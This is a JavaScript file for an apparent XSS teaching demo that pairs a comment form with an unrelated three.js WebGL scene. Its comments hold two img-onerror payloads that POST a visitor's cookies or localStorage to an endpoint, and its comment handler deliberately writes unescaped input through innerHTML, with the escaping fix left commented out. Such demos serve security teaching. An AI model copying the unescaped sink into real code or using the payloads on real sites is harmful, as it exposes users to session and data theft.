// @ts-nocheck
import message_template from './message_template.html?raw';

/**
 * Example of XSS protection function
 */

String.prototype.escape = function () {
  const tagsToReplace = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
  };
  return this.replace(/[&<>]/g, function (tag) {
    return tagsToReplace[tag] || tag;
  });
};

/**
 * Message examples
 */

// Hello everyone!
// <img src onerror='fetch(`${window.location.href}malicious_endpoint`, {
//     method: "POST",
//     headers: { "Content-Type": "application/json" },
//     body: JSON.stringify(window.localStorage),
//   }).then((res) => {console.log(res)});' />

// Hello everyone!
// <img src onerror='fetch(`${window.location.href}malicious_endpoint`, {
//     method: "POST",
//     headers: { "Content-Type": "application/json" },
//     body: JSON.stringify(document.cookie),
//   }).then((res) => {console.log(res)});' />

/**
 * Sent new message in comments
 */

const commentForm = document.querySelector('.comment-form');
const comments = document.querySelector('div.max-w-2xl');

const onSentMessage = (event) => {
  event.preventDefault();
  const message = event.target[0].value;

  /**
   * Uncomment next line to fix xss
   */

  // const value = message.escape();
  const value = message;

  console.log(value);

  const newComment = document.createElement('article');
  newComment.classList = 'p-6 mb-6 text-base bg-white rounded-lg dark:bg-gray-900';
  newComment.innerHTML = message_template.replace(/{{message}}/gi, value);
  comments.appendChild(newComment);
  commentForm.after(newComment);
  event.target[0].value = '';
};

commentForm.addEventListener('submit', onSentMessage);

/**
 * Code below for WebGL and doesn't connect to XSS
 */

import * as THREE from 'three';
import { OrbitControls } from 'three/examples/jsm/controls/OrbitControls.js';
import { GLTFLoader } from 'three/examples/jsm/loaders/GLTFLoader.js';
import { gsap } from 'gsap';

/**
 * Loaders
 */
const loadingBarElement = document.querySelector('.loading-bar');
let sceneReady = false;
const loadingManager = new THREE.LoadingManager(
  // Loaded
  () => {
    // Wait a little
    window.setTimeout(() => {
      // Animate overlay
      gsap.to(overlayMaterial.uniforms.uAlpha, { duration: 3, value: 0, delay: 1 });

      // Update loadingBarElement
      loadingBarElement.classList.add('ended');
      loadingBarElement.style.transform = '';
    }, 500);

    window.setTimeout(() => {
      sceneReady = true;
    }, 3000);
  },

  // Progress
  (itemUrl, itemsLoaded, itemsTotal) => {
    // Calculate the progress and update the loadingBarElement
    const progress = Math.round((itemsLoaded / itemsTotal) * 100) / 100;
    loadingBarElement.style.transform = `translate(-50%, -50%) scaleX(${progress})`;
  },
);
const gltfLoader = new GLTFLoader(loadingManager);
const cubeTextureLoader = new THREE.CubeTextureLoader(loadingManager);

/**
 * Base
 */
// Debug
const debugObject = {};

// Canvas
const canvas = document.getElementById('webgl');

// Scene
const scene = new THREE.Scene();

/**
 * Overlay
 */
const overlayGeometry = new THREE.PlaneGeometry(2, 2, 1, 1);
const overlayMaterial = new THREE.ShaderMaterial({
  // wireframe: true,
  transparent: true,
  uniforms: {
    uAlpha: { value: 1 },
  },
  vertexShader: `
        void main()
        {
            gl_Position = vec4(position, 1.0);
        }
    `,
  fragmentShader: `
        uniform float uAlpha;

        void main()
        {
            gl_FragColor = vec4(0.0, 0.0, 0.0, uAlpha);
        }
    `,
});
const overlay = new THREE.Mesh(overlayGeometry, overlayMaterial);
// scene.add(overlay);

/**
 * Update all materials
 */
const updateAllMaterials = () => {
  scene.traverse((child) => {
    if (child instanceof THREE.Mesh && child.material instanceof THREE.MeshStandardMaterial) {
      // child.material.envMap = environmentMap
      child.material.envMapIntensity = debugObject.envMapIntensity;
      child.material.needsUpdate = true;
      child.castShadow = true;
      child.receiveShadow = true;
    }
  });
};

/**
 * Environment map
 */
const environmentMap = cubeTextureLoader.load([
  '/textures/environmentMaps/00/px.jpg',
  '/textures/environmentMaps/00/nx.jpg',
  '/textures/environmentMaps/00/py.jpg',
  '/textures/environmentMaps/00/ny.jpg',
  '/textures/environmentMaps/00/pz.jpg',
  '/textures/environmentMaps/00/nz.jpg',
]);

environmentMap.encoding = THREE.sRGBEncoding;

scene.background = environmentMap;
scene.environment = environmentMap;

debugObject.envMapIntensity = 2.5;

/**
 * Models
 */
let gltfModel = null;

gltfLoader.load('/models/DamagedHelmet/glTF/DamagedHelmet.gltf', (gltf) => {
  gltfModel = gltf;
  gltfModel.scene.scale.set(2.5, 2.5, 2.5);
  gltfModel.scene.rotation.y = Math.PI * 0.8;
  gltfModel.scene.position.z = -2;
  gltfModel.scene.position.x = -1.5;
  scene.add(gltfModel.scene);

  updateAllMaterials();
});

/**
 * Lights
 */
const directionalLight = new THREE.DirectionalLight('#ffffff', 3);
directionalLight.castShadow = true;
directionalLight.shadow.camera.far = 15;
directionalLight.shadow.mapSize.set(1024, 1024);
directionalLight.shadow.normalBias = 0.05;
directionalLight.position.set(0.25, 3, -2.25);
scene.add(directionalLight);

/**
 * Sizes
 */
const sizes = {
  width: window.innerWidth,
  height: window.innerHeight,
};

window.addEventListener('resize', () => {
  // Update sizes
  sizes.width = window.innerWidth;
  sizes.height = window.innerHeight;

  // Update camera
  camera.aspect = sizes.width / sizes.height;
  camera.updateProjectionMatrix();

  // Update renderer
  renderer.setSize(sizes.width, sizes.height);
  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
});

/**
 * Camera
 */
// Base camera
const camera = new THREE.PerspectiveCamera(75, sizes.width / sizes.height, 0.1, 100);
camera.position.set(4, 1, -4);
scene.add(camera);

// Controls
const controls = new OrbitControls(camera, canvas);
controls.enableDamping = true;

/**
 * Renderer
 */
const renderer = new THREE.WebGLRenderer({
  canvas: canvas,
  antialias: true,
});
renderer.physicallyCorrectLights = true;
renderer.outputEncoding = THREE.sRGBEncoding;
renderer.toneMapping = THREE.ReinhardToneMapping;
renderer.toneMappingExposure = 3;
renderer.shadowMap.enabled = true;
renderer.shadowMap.type = THREE.PCFSoftShadowMap;
renderer.setSize(sizes.width, sizes.height);
renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

/**
 * Animate
 */

const clock = new THREE.Clock();
const tick = () => {
  const elapsedTime = clock.getElapsedTime();

  // Update controls
  controls.update();

  if (gltfModel) {
    gltfModel.scene.position.z = Math.sin(elapsedTime * 0.2) * 0.1 - 2;
    gltfModel.scene.position.x = Math.cos(elapsedTime * 0.2) * 0.5 - 1.5;
  }
  // Render
  renderer.render(scene, camera);

  // Call tick again on the next frame
  window.requestAnimationFrame(tick);
};

tick();
